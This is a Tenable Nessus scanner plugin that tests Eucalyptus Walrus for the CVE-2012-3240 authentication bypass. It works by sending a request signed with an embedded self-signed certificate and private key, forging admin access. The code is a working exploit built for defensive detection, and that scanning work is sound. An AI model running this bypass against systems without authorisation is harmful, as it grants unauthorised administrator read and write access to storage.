#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(61611);
  script_version("$Revision: 1.5 $");
  script_cvs_date("$Date: 2016/11/11 20:08:42 $");

  script_cve_id("CVE-2012-3240");
  script_bugtraq_id(54404);
  script_osvdb_id(83743);

  script_name(english:"Eucalyptus Walrus REST Interface Key Verification Authentication Bypass (ESA-03)");
  script_summary(english:"Attempts to access a non-existent bucket with an unauthorized key");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a Java application that is affected by a
security bypass vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of Eucalyptus Walrus hosted on the remote web server
contains a flaw in the 'WalrusComponentLoginModule' class's
'authenticate' method that allows a remote, unauthenticated attacker to
create, read, and write to buckets as an administrator. 

When an affected Walrus instance receives a REST request, it processes
that request in the context of an administrative user and verifies that
the RSA signature in the 'EucaSignature' header matches the public key
from the X.509 certificate in the 'EucaCert' header.  The issue is that
while the correlation between the certificate and the signature is
checked, no effort is made to ensure that the certificate is recognized
as trusted.");
  script_set_attribute(attribute:"solution", value:"Upgrade to version 3.0.2 / 3.1.0 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:U/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"see_also", value:"http://www.eucalyptus.com/eucalyptus-cloud/security/esa-03");
  script_set_attribute(attribute:"see_also", value:"https://eucalyptus.atlassian.net/browse/EUCA-1717");
  # https://github.com/eucalyptus/eucalyptus/commit/eb36703c0ba7225de03e15885d5ca12a3f917734
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?fd1057d0");

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/07/11");
  script_set_attribute(attribute:"patch_publication_date", value:"2012/03/26");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/08/21");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:eucalyptus:eucalyptus");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2012-2016 Tenable Network Security, Inc.");

  script_dependencies("eucalyptus_walrus_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_keys("www/eucalyptus_walrus");
  script_require_ports("Services/www", 8773);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("http.inc");
include("webapp_func.inc");
include("x509_func.inc");

app = "Eucalyptus Walrus";

# This is a basic self-signed certificate. Its contents don't matter
# to the server, it simply needs to contain the public key that
# matches the private key.
#
# The certificate is set to expire in 2038, the end of the 32-bit Unix
# epoch.
cert_pem = "
-----BEGIN CERTIFICATE-----
MIICEjCCAXugAwIBAgIJAIdQPDFUl8GzMA0GCSqGSIb3DQEBBQUAMBExDzANBgNV
BAMTBk5lc3N1czAeFw0xMjA4MTQxODA1NTRaFw0zODAxMDExODA1NTRaMBExDzAN
BgNVBAMTBk5lc3N1czCBnzANBgkqhkiG9w0BAQEFAAOBjQAwgYkCgYEAzhOW8OM0
FjLrC40VkNY5kiY6iElj+3Kj7VW70+UuOsuiU8iEGZ0U0YrO5yJ+M5A8/r+emA+z
kyMYJYTXBC6n1Mf+BxPvvomTiavp+UHjY5OR8njVP1eCiHghtJq2YJO0a20VCN+Q
TBvi7S8fZzqb4n+RlYj4PfRSkLCvWCYOGiECAwEAAaNyMHAwHQYDVR0OBBYEFGRB
9OoNhtr3iWUw288D8shKhDLcMEEGA1UdIwQ6MDiAFGRB9OoNhtr3iWUw288D8shK
hDLcoRWkEzARMQ8wDQYDVQQDEwZOZXNzdXOCCQCHUDwxVJfBszAMBgNVHRMEBTAD
AQH/MA0GCSqGSIb3DQEBBQUAA4GBAKIgfM47Qbx0EMASVFGVXcrpZCQw+cruu9sy
Kq28ojh27X9m0bAU7zZC0qW/RRurOf/DaBp/CSvENcipv0+lcqolbxoFQFjzhV17
8BqqEU8MeWaY0uRyhaHmZRF0Cj1oi6839rTzgyvpCyBPwYRBHNtTpvqh1f+KfS+g
RBrhCcFQ
-----END CERTIFICATE-----";

# This is a randomly-generated 1024-bit RSA key. Its specifics don't
# matter, it simply needs to contain the private key that matches the
# public key.
key_pem = "
MIICXQIBAAKBgQDOE5bw4zQWMusLjRWQ1jmSJjqISWP7cqPtVbvT5S46y6JTyIQZ
nRTRis7nIn4zkDz+v56YD7OTIxglhNcELqfUx/4HE+++iZOJq+n5QeNjk5HyeNU/
V4KIeCG0mrZgk7RrbRUI35BMG+LtLx9nOpvif5GViPg99FKQsK9YJg4aIQIDAQAB
AoGAXa9mNYj1CwqG9K9lGH1rmteqUH8c5xlNEP6i70gHZk9hMrm75HEXH9P9D/MM
cKCoOiAfF3474y5XMedcYNhdD3swInEQYqqNcfr9dyPPKJlHucK4I0xw2pgA67yM
+2UhmmE7UYIEEg5cemMgSi5vIuQxwMF+hM2XpcIJAzWnCYECQQD9JfDzs08pqF3n
ALkEa+ZPcBf4cUNzjrlkOKCwbh0PT4FsSg+lC7qlsXdiwwZXDZb/w73DKsIi7cRy
kKnDWoI5AkEA0GXlwgowfOiAtZHq1qpen0J+1a3PIvedcOsFmtk766pcjIYkgVtO
pNy3U6rH554GUcuQ+nIPBVbQqW51ez03KQJBAJrzhWh2Qid6knfafmWRcjj/oPyG
v8XU/++zpdA4pnr/rHXPY4IgCtBvL2d5fsD8ZYgKlXYIDyr4JP4HRJJ6LSkCQHHA
vTo+j5sO2nrBzHsiggXSqSL//cnreWASmXudykxoMJ5v9ms5qOLqq5Ma7IVsR6zM
PjXGnpZefgWOCsibcIkCQQDtcUzW8sCEcVWI5C8YPLLhizVvtGTiGbN65es1bsdF
i5R09c4ks2ih5stK0mjEZmzbQmDO++Sg4Q9xmqLhBzCp";

# Extract the necessary components of our RSA key.
key = str_replace(string:key_pem, find:'\n', replace:"");
key = base64_decode(str:key);
rsa = der_parse_sequence(seq:key, list:TRUE);
if (isnull(rsa) || rsa[0] != 9)
  exit(1, "Failed to parse builtin key.");

rsa_n = der_parse_data(tag:0x02, data:rsa[2]);
rsa_e = der_parse_data(tag:0x02, data:rsa[3]);
rsa_d = der_parse_data(tag:0x02, data:rsa[4]);

if (isnull(rsa[2]) || isnull(rsa[3]) || isnull(rsa[4]))
  exit(1, "Failed to parse builtin key.");

# Remove leading NUL byte, they're padding not data.
if (ord(rsa_n[0]) == 0)
  rsa_n = substr(rsa_n, 1, strlen(rsa_n) - 1);
if (ord(rsa_e[0]) == 0)
  rsa_e = substr(rsa_e, 1, strlen(rsa_e) - 1);
if (ord(rsa_d[0]) == 0)
  rsa_d = substr(rsa_d, 1, strlen(rsa_d) - 1);

# The admin user exists by default, but no buckets exist by default.
# Even if we don't try to access the admin's buckets, vulnerable
# systems assume we're the admin.
user = "admin";
bucket = (SCRIPT_NAME - ".nasl") + "-" + unixtime();

# Get details of Walrus.
port = get_http_port(default:8773);
install = get_install_from_kb(appname:"eucalyptus_walrus", port:port, exit_on_fail:TRUE);
dir = install["dir"];

# Construct the URL.
path = dir + "/services/Walrus";
url = build_url(port:port, qs:path);

# Put together the key pieces of data the get signed.
verb = "GET";
date = "";
path += "/" + user + "/" + bucket;

# Sign our request with our private key.
req = verb + '\n' + date + '\n' + path + '\n';
hash = SHA1(req);
sig = rsa_sign(data:hash, n:rsa_n, e:rsa_e, d:rsa_d);

# Make the headers for the REST request, including our certificate and
# the signature.
hdrs = make_array(
  "Authorization", "Euca",
  "EucaOperation", "GetObject",
  "Date", date,
  "EucaCert", base64(str:cert_pem),
  "EucaSignature", base64(str:sig)
);

# Send the method invocation.
res = http_send_recv3(
  port         : port,
  method       : verb,
  item         : path,
  add_headers  : hdrs,
  fetch404     : TRUE,
  exit_on_fail : TRUE
);

# A variety of responses can come back, but the exploit was successful
# only if we are told that the bucket was not found.
if (
  "<Code>NoSuchEntity</Code>" >!< res[2] ||
  "<Resource>" + bucket + "</Resource>" >!< res[2]
) audit(AUDIT_WEB_APP_NOT_AFFECTED, app, url);

# Save the request to display in the report.
req = http_last_sent_request();

# Report our findings.
report = NULL;
if (report_verbosity > 0)
{
  report =
    '\nNessus was able to confirm the vulnerability on the remote host. The' +
    '\nfollowing HTTP request was used to access Walrus as admin :'+
    '\n' +
    '\n  ' + join(split(req, sep:'\r\n', keep:FALSE), sep:'\n  ') +
    '\n';
}

security_warning(port:port, extra:report);
